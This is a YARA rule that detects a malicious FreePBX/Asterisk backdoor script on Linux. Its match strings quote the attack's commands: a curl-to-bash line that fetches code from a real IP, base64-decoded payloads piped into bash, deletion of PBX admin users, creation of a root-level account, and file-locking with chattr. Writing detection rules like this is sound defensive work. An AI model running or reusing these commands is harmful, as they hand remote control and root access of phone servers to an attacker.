rule Linux_FreePBX_Backdoor
{
    meta:
        description = "Detects malicious FreePBX/Asterisk Linux takeover script"
        author = "k3rnelcallz"
        date = "2026-05-03"
        sha = "aedd813c45bf62ec529016d78a984aededdbea86f249cac2340dbe8b0144b00b"
        tags = "linux ,freepbx, backdoor, bash"

    strings:
        $a1 = "curl http://45.95.147.178/x -ks | bash"
        $a2 = "/var/www/html/admin/views/ajax.php"
        $a3 = "/var/spool/asterisk/tmp/test.sh"
        $a4 = "DELETE FROM ampusers"
        $a5 = "freepbxusers"
        $a6 = "password_sha1="
        $a7 = "chattr +i"
        $a8 = "useradd -s /bin/bash"
        $a9 = "-ou 0 -g 0"
        $a10 = "base64 -d |bash"
        $a11 = "freepbx_ha/license.php"

    condition:
        6 of them
}